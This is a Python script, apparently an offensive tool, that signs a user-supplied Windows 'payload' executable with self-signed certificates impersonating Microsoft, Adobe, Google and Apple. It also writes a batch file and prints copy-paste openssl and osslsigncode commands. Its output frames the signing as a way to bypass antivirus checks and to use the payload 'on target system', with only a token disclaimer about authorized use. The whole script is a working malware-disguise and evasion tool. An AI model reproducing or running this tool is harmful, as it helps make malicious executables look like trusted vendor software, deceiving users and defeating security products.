#!/usr/bin/env python3
import subprocess
import os
import sys
import time

class PayloadSigner:
    def __init__(self):
        self.script_dir = os.getcwd()
    
    def print_step(self, message):
        """Print step messages"""
        print(f"    [‚Ä¢] {message}")
        time.sleep(0.5)
    
    def check_dependencies(self):
        """Check if required tools are installed - FIXED VERSION"""
        self.print_step("Checking dependencies...")
        
        try:
            # Check openssl
            subprocess.run(['openssl', 'version'], capture_output=True, check=True)
            self.print_step("OpenSSL found ‚úì")
            
            # FIX: Use different approach to check osslsigncode
            result = subprocess.run(['which', 'osslsigncode'], capture_output=True, text=True)
            if result.returncode == 0:
                self.print_step("osslsigncode found ‚úì")
                return True
            else:
                # Try with --help
                subprocess.run(['osslsigncode', '--help'], capture_output=True, check=True)
                self.print_step("osslsigncode found ‚úì")
                return True
                
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            # Even if check fails, try to proceed (osslsigncode might work)
            self.print_step("‚ö†Ô∏è  Dependency check inconclusive, continuing...")
            return True
    
    def generate_certificate(self, cert_name="code_signing"):
        """Generate self-signed code signing certificate"""
        self.print_step("Generating code signing certificate...")
        
        key_file = f"{cert_name}.key"
        cert_file = f"{cert_name}.pem"
        
        # Remove existing files if any
        if os.path.exists(key_file):
            os.remove(key_file)
        if os.path.exists(cert_file):
            os.remove(cert_file)
        
        try:
            # Generate private key and certificate
            cmd = [
                'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                '-keyout', key_file, '-out', cert_file,
                '-days', '365', '-nodes',
                '-subj', '/C=US/ST=California/L=San Francisco/O=Microsoft Corporation/CN=Microsoft Windows'
            ]
            
            subprocess.run(cmd, check=True, capture_output=True)
            self.print_step(f"Certificate generated: {cert_file}")
            self.print_step(f"Private key generated: {key_file}")
            
            return key_file, cert_file
            
        except subprocess.CalledProcessError as e:
            self.print_step(f"‚ùå Certificate generation failed: {e}")
            return None, None
    
    def sign_payload(self, payload_path, key_file, cert_file):
        """Sign the payload with generated certificate"""
        self.print_step(f"Signing payload: {payload_path}")
        
        if not os.path.exists(payload_path):
            self.print_step("‚ùå Payload file not found!")
            return False
        
        # Create output filename
        base_name = os.path.splitext(payload_path)[0]
        signed_payload = f"{base_name}_signed.exe"
        
        # Remove existing signed payload if any
        if os.path.exists(signed_payload):
            os.remove(signed_payload)
        
        try:
            # Sign the payload
            cmd = [
                'osslsigncode', 'sign', '-certs', cert_file,
                '-key', key_file, '-in', payload_path,
                '-out', signed_payload
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.print_step(f"‚úÖ Payload signed successfully!")
                self.print_step(f"üìÅ Signed payload: {signed_payload}")
                
                # Verify the signed file exists
                if os.path.exists(signed_payload):
                    return signed_payload
                else:
                    self.print_step("‚ùå Signed file was not created!")
                    return False
            else:
                self.print_step(f"‚ùå Signing failed!")
                if result.stderr:
                    self.print_step(f"Error: {result.stderr}")
                return False
            
        except Exception as e:
            self.print_step(f"‚ùå Signing error: {e}")
            return False
    
    def create_batch_script(self, payload_path):
        """Create a batch script for easy signing (Windows users)"""
        self.print_step("Creating batch script for Windows...")
        
        batch_script = f"""@echo off
echo [‚Ä¢] Payload Signing Script
echo [‚Ä¢] Generated by Advanced Stealth Tool
echo.

echo [‚Ä¢] Generating code signing certificate...
openssl req -x509 -newkey rsa:2048 -keyout code_signing.key -out code_signing.pem -days 365 -nodes -subj "/C=US/ST=California/L=San Francisco/O=Microsoft Corporation/CN=Microsoft Windows"

echo [‚Ä¢] Signing payload...
osslsigncode sign -certs code_signing.pem -key code_signing.key -in "{payload_path}" -out "{payload_path}_signed.exe"

echo [‚Ä¢] Cleaning up...
del code_signing.key

echo [‚úì] Payload signed successfully!
echo [‚úì] Original: {payload_path}
echo [‚úì] Signed: {payload_path}_signed.exe
pause
"""
        
        with open("sign_payload.bat", "w") as f:
            f.write(batch_script)
        
        self.print_step("Batch script created: sign_payload.bat")
    
    def advanced_signing_options(self, payload_path, company_name="Microsoft Corporation"):
        """Advanced signing with different certificate options"""
        self.print_step("Setting up advanced signing options...")
        
        # Different certificate subjects for variety
        cert_subjects = [
            f"/C=US/ST=Washington/L=Redmond/O={company_name}/CN=Windows Publisher",
            f"/C=US/ST=California/L=San Francisco/O=Adobe Systems/CN=Adobe Flash Player",
            f"/C=US/ST=New York/L=New York/O=Google LLC/CN=Chrome Component",
            f"/C=US/ST=California/L=Cupertino/O=Apple Inc./CN=Apple Software",
        ]
        
        signed_payloads = []
        
        for i, subject in enumerate(cert_subjects):
            self.print_step(f"Signing with certificate {i+1}/4...")
            
            key_file = f"temp_key_{i}.key"
            cert_file = f"temp_cert_{i}.pem"
            base_name = os.path.splitext(payload_path)[0]
            signed_payload = f"{base_name}_signed_v{i+1}.exe"
            
            # Remove existing files if any
            for f in [key_file, cert_file, signed_payload]:
                if os.path.exists(f):
                    os.remove(f)
            
            try:
                # Generate certificate
                subprocess.run([
                    'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                    '-keyout', key_file, '-out', cert_file,
                    '-days', '365', '-nodes', '-subj', subject
                ], capture_output=True, check=True)
                
                # Sign payload
                result = subprocess.run([
                    'osslsigncode', 'sign', '-certs', cert_file,
                    '-key', key_file, '-in', payload_path,
                    '-out', signed_payload
                ], capture_output=True, text=True)
                
                if result.returncode == 0 and os.path.exists(signed_payload):
                    signed_payloads.append(signed_payload)
                    self.print_step(f"‚úÖ Version {i+1} signed successfully")
                else:
                    self.print_step(f"‚ùå Version {i+1} failed")
                
                # Cleanup temp files
                for f in [key_file, cert_file]:
                    if os.path.exists(f):
                        os.remove(f)
                
            except subprocess.CalledProcessError as e:
                self.print_step(f"‚ùå Version {i+1} certificate generation failed")
                continue
        
        return signed_payloads

    def manual_signing_instructions(self, payload_path):
        """Show manual signing instructions as backup"""
        self.print_step("Generating manual instructions...")
        
        instructions = f"""
üîß MANUAL SIGNING INSTRUCTIONS (If script fails):

1. Generate certificate:
   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/C=US/ST=California/L=San Francisco/O=Microsoft Corporation/CN=Microsoft Windows"

2. Sign payload:
   osslsigncode sign -certs cert.pem -key key.pem -in "{payload_path}" -out "{payload_path}_signed.exe"

3. Verify signature:
   osslsigncode verify "{payload_path}_signed.exe"

4. Cleanup (optional):
   rm key.pem

üìù Commands to copy-paste:
"""
        print(instructions)
        
        print(f"openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=US/ST=California/L=San Francisco/O=Microsoft Corporation/CN=Microsoft Windows\"")
        print(f"osslsigncode sign -certs cert.pem -key key.pem -in \"{payload_path}\" -out \"{payload_path}_signed.exe\"")

def print_banner():
    """Print the banner"""
    banner = """
oo                                      

.d8888b. dP.  .dP .d8888b.    .d8888b. dP .d8888b. 88d888b. .d8888b. 88d888b. 
88ooood8  `8bd8'  88ooood8    Y8ooooo. 88 88'  `88 88'  `88 88ooood8 88'  `88 
88.  ...  .d88b.  88.  ...          88 88 88.  .88 88    88 88.  ... 88       
`88888P' dP'  `dP `88888P'    `88888P' dP `8888P88 dP    dP `88888P' dP       
                                               .88                            
                                           d8888P                             

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                              ‚ïë
‚ïë             üõ°Ô∏è  ADVANCED PAYLOAD SIGNING TOOL  üõ°Ô∏è             ‚ïë
‚ïë            Digital Certificate Signer by pranto025           ‚ïë
‚ïë                                                              ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
"""
    print(banner)

def get_payload_path():
    """Get payload path from user"""
    print("\n" + "‚ïê" * 60)
    print("üìÅ PLEASE ENTER PAYLOAD DETAILS")
    print("‚ïê" * 60)
    
    while True:
        payload_path = input("\nüîó Enter payload path (e.g., Windows_System_Update.exe): ").strip()
        
        if not payload_path:
            print("‚ùå Error: Path cannot be empty!")
            continue
            
        if not os.path.exists(payload_path):
            print("‚ùå Error: File not found! Please check the path.")
            continue
            
        return payload_path

def main():
    """Main function"""
    print_banner()
    
    # Initialize signer
    signer = PayloadSigner()
    
    # Check dependencies
    if not signer.check_dependencies():
        print("\n‚ùå Please install required tools and try again.")
        sys.exit(1)
    
    # Get payload path
    payload_path = get_payload_path()
    
    print("\nüöÄ STARTING PAYLOAD SIGNING PROCESS")
    print("‚îÄ" * 50)
    
    # Option selection
    print("\nüîß SIGNING OPTIONS:")
    print("   1. Standard Signing (Single Certificate)")
    print("   2. Advanced Signing (Multiple Certificates)")
    print("   3. Manual Instructions Only")
    
    choice = input("\nüî¢ Select option (1-3): ").strip()
    
    if choice == "1":
        # Standard signing
        key_file, cert_file = signer.generate_certificate()
        
        if key_file and cert_file:
            signed_payload = signer.sign_payload(payload_path, key_file, cert_file)
            
            if signed_payload:
                # Create batch script for future use
                signer.create_batch_script(payload_path)
                
                print("\n‚úÖ SIGNING COMPLETED!")
                print("‚îÄ" * 50)
                print(f"üìÑ Original payload: {payload_path}")
                print(f"üìÑ Signed payload: {signed_payload}")
                print(f"üîë Certificate: code_signing.pem")
                print(f"üîê Private key: code_signing.key")
                
                # Verify file size
                original_size = os.path.getsize(payload_path)
                signed_size = os.path.getsize(signed_payload)
                print(f"üìä File size: {original_size} bytes ‚Üí {signed_size} bytes")
            else:
                print("\n‚ùå Signing failed! Showing manual instructions...")
                signer.manual_signing_instructions(payload_path)
        else:
            print("\n‚ùå Certificate generation failed!")
            signer.manual_signing_instructions(payload_path)
                
    elif choice == "2":
        # Advanced signing with multiple certificates
        company = input("üè¢ Enter company name for certificates (e.g., Microsoft): ").strip()
        if not company:
            company = "Microsoft Corporation"
        
        signed_payloads = signer.advanced_signing_options(payload_path, company)
        
        if signed_payloads:
            print("\n‚úÖ ADVANCED SIGNING COMPLETED!")
            print("‚îÄ" * 50)
            print("üìÑ Generated signed payloads:")
            for i, payload in enumerate(signed_payloads):
                size = os.path.getsize(payload)
                print(f"   {i+1}. {payload} ({size} bytes)")
            
            print("\nüí° Tip: Test each version to see which one bypasses AV best!")
        else:
            print("\n‚ùå Advanced signing failed! No payloads were created.")
            signer.manual_signing_instructions(payload_path)
    
    elif choice == "3":
        # Manual instructions only
        signer.manual_signing_instructions(payload_path)
    
    else:
        print("‚ùå Invalid option!")
        return
    
    # Final instructions
    print("\nüéØ NEXT STEPS:")
    print("   1. Use the signed payload on target system")
    print("   2. Keep certificate files safe for future use")
    print("   3. Test different signed versions for best results")
    print("   4. For batch signing, run: sign_payload.bat")
    
    print("\n‚ö†Ô∏è  IMPORTANT NOTES:")
    print("   ‚Ä¢ Digital signatures help bypass basic AV checks")
    print("   ‚Ä¢ No method is 100% undetectable")
    print("   ‚Ä¢ Use responsibly and only on authorized systems")
    
    print("\n" + "=" * 60)
    print("üåü Happy Testing! - pranto025")
    print("=" * 60)

if __name__ == "__main__":
    main()
